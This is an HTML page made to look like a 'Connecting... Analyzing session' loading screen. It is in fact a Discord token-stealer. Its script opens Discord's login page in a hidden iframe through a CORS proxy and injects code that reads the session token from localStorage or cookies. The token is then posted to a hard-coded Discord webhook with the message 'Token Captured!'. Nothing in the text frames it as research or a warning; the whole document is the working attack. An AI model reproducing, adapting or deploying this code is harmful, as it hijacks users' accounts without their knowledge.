<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        body { background: #282b30; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #msg { margin-top: 20px; font-size: 14px; color: #999; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <div id="msg">Analyzing session...</div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";

        function sendToWebhook(data) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `🔓 **Token Captured!**\n\n\`\`\`${data}\`\`\`` })
            }).then(() => {
                document.getElementById('msg').innerText = "Token sent successfully!";
            }).catch(() => {
                document.getElementById('msg').innerText = "Error sending to webhook.";
            });
        }

        // Listen for messages from the iframe
        window.addEventListener("message", function(event) {
            if (event.origin === "https://corsproxy.io" && event.data) {
                console.log("Token received:", event.data);
                sendToWebhook(event.data);
                document.getElementById('msg').innerText = "Success!";
            }
        });

        // Create the iframe
        const iframe = document.createElement('iframe');
        
        // Use corsproxy.io to bypass X-Frame-Options
        // Encode the Discord URL so it’s properly formatted
        const discordUrl = encodeURIComponent('https://discord.com/login');
        iframe.src = `https://corsproxy.io/?${discordUrl}`;
        
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        // Inject script after iframe loads
        iframe.onload = function() {
            try {
                const doc = iframe.contentDocument || iframe.contentWindow.document;
                
                const script = doc.createElement('script');
                script.textContent = `
                    window.addEventListener('load', function() {
                        const token = localStorage.getItem('token');
                        if (token) {
                            window.parent.postMessage(token, '*');
                        } else {
                            // Fallback: check cookies
                            const cookies = document.cookie;
                            const tokenMatch = cookies.match(/(?:^|;\s*)token=([^;]*)/);
                            if (tokenMatch) {
                                window.parent.postMessage(decodeURIComponent(tokenMatch[1]), '*');
                            } else {
                                window.parent.postMessage('NO_TOKEN_FOUND', '*');
                            }
                        }
                    });
                `;
                
                doc.body.appendChild(script);
                
                // Timeout fallback
                setTimeout(() => {
                    document.getElementById('msg').innerText = "Timeout waiting for token.";
                }, 10000);

            } catch (e) {
                console.error("Failed to inject script:", e);
                document.getElementById('msg').innerText = "Injection failed.";
            }
        };
    </script>
</body>
</html>
